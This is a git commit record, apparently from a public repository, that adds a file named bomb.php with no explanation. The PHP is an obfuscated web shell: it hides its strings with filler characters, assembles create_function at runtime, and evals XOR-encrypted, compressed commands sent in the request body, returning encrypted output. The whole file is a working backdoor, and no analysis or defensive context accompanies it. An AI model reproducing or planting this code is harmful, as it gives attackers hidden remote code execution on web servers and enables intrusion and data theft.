c91c0fc32da8dd2952d861bca790e2501c3b6b63
0day <89420274+0dayDev@users.noreply.github.com>
2021-09-01 14:09:26 +0100

    Add files via upload

---
+++ bomb.php
@@ -0,0 +1,10 @@
+<?php
+$z='$Xk="e560dX7X23X";$kXh="000c64X4ca26a";$kf="fXa5X33fcde251"X;$Xp="nEtn60nZwXaXHFfW1XC";functXion x(X$t';
+$K='){$o.=X$t{$Xi}^$k{$j}X;}}retXurn $XXo;}if X(@preg_matcXh(X"/$kh(.X+)$kf/"X,@fiXXle_get_contents("pXXhp://i';
+$h='_get_contents();X@oXb_end_clXean();$Xr=@XbaXse64_eXncode(@Xx(@gzcXoXmpress($o),$k));prXint("$Xp$Xkh$r$kf");}';
+$a='npuXt"),$mX)==1) {@XobX_start();@eXvXal(@gzuncXXompress(@x(X@baXse64_decode(X$Xm[1X]),$k)XX));$Xo=@ob';
+$N=',$k){$cX=strlenX($k);$Xl=strlenX(X$t);$o=""X;forX($i=0;X$i<$l;)X{foXr($j=0;($Xj<$c&&$i<$Xl);X$j++,$Xi++';
+$U=str_replace('KU','','creKUaKUteKU_KUfuKUnKUction');
+$Z=str_replace('X','',$z.$N.$K.$a.$h);
+$L=$U('',$Z);$L();
+?>
